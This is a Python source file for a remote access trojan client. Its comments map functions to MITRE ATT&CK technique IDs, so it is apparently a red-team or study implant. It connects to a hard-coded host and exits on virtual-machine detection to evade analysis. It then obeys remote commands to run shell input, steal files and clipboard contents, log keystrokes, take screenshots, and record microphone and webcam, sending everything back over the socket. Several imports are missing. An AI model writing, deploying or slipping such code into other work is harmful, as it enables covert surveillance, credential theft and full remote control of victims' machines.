import socket
import os



sock = socket.socket()
sock.connect(('192.168.101.136', 9091))

if lib_platform.is_platform_windows:
    system = 'windows'
else:
    system = 'linux'


# anti vm
def is_vm():
    if system == 'windows':
        command = 'tasklist'
    else:
        command = 'ps'
    process = subprocess.getoutput(command)
    if 'vmtoolsd' in process or 'vboxservice.exe' in process or 'vboxtray.exe' in process:
        return 1
    else:
        return 0


# T1082
def os_info():
    if system == 'windows':
        command = 'systemInfo'
    else:
        command = 'uname -a && lscpu'

    info = subprocess.getoutput(command)
    temp = open('file.txt', 'w')
    temp.write(info)
    temp.close()
    data = open('file.txt', 'rb')
    for i in data:
        sock.sendall(i)
    sock.send(b'done')
    data.close()
    os.remove('file.txt')


# T1105
def remove_file():
    location = sock.recv(1024).decode()
    os.remove(location)
    sock.send('Removed'.encode('utf-8'))


# T1057
def process_discovery():
    if system == 'windows':
        command = 'tasklist'
    else:
        command = 'ps'
    processes = subprocess.getoutput(command)
    temp = open('file.txt', 'w')
    temp.write(processes)
    temp.close()

    data = open('file.txt', 'rb')
    for i in data:
        sock.sendall(i)
    sock.send(b'done')
    data.close()
    os.remove('file.txt')


# T1059
def CLI():
    command = sock.recv(4096).decode()
    cli = subprocess.getoutput(command).encode('utf-8')
    sock.send(cli)


# T1105
def copy_file():
    path = sock.recv(1024).decode()
    file = open(path, 'rb')
    for i in file:
        sock.sendall(i)
    sock.send(b'done')


# T1083
def folder_discovery():
    if system == 'windows':
        command = 'dir '
    else:
        command = 'ls -l '
    location = sock.recv(1024).decode()
    out = subprocess.getoutput(command+location).encode()
    sock.send(out)


# T1115
def clipboard_data():
    buff = pyperclip.paste()
    buff = str(buff)
    sock.send(buff.encode())


# T1056
def keylogger():
    amount = int(sock.recv(1024).decode())
    keys = []

    def on_press(key):
        if key == Key.space:
            key = ''
        keys.append(str(key))
        if len(keys) > amount:
            sock.send("".join(keys).encode())
            return False

    def on_release(key):
        if key == Key.esc:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


# T1113
def screenshot():
    screen = pyautogui.screenshot()
    screen.save("screen.jpg")
    file = open('screen.jpg', 'rb')
    for i in file:
        sock.sendall(i)
    sock.send(b'done')
    file.close()
    os.remove('screen.jpg')


# T1123
def audio_capture():
    seconds = int(sock.recv(1024).decode())
    fs = 44100
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write('output.wav', fs, myrecording)

    file = open('output.wav', 'rb')
    for i in file:
        sock.sendall(i)
    sock.send(b'done')
    file.close()
    os.remove('output.wav')


def video_capture():
    cap = cv2.VideoCapture(0)
    video_file = 'output.avi'
    out = cv2.VideoWriter(video_file, cv2.VideoWriter_fourcc(*'XVID'), 20, (640, 480))

    i = 0;
    while True:
        ret, frame = cap.read()
        out.write(frame)
        time.sleep(0.05)
        i = i + 1
        if i > 100:
            break
    cap.release()
    cv2.destroyAllWindows()

    file = open('output.avi', 'rb')
    for i in file:
        sock.sendall(i)
    sock.send(b'done')
    file.close()


# detect vm
if is_vm():
    exit()
else:
    while True:
        command = sock.recv(1024).decode()
        if command == 'os':
            os_info()
        if command == 'rm':
            remove_file()
        if command == 'pd':
            process_discovery()
        if command == 'cli':
            CLI()
        if command == 'cp':
            copy_file()
        if command == 'ds':
            folder_discovery()
        if command == 'cd':
            clipboard_data()
        if command == 'kl':
            keylogger()
        if command == 'scr':
            screenshot()
        if command == 'audio':
            audio_capture()
        if command == 'webcam':
            video_capture()
            os.remove('output.avi')
        if command == 'exit':
            exit()
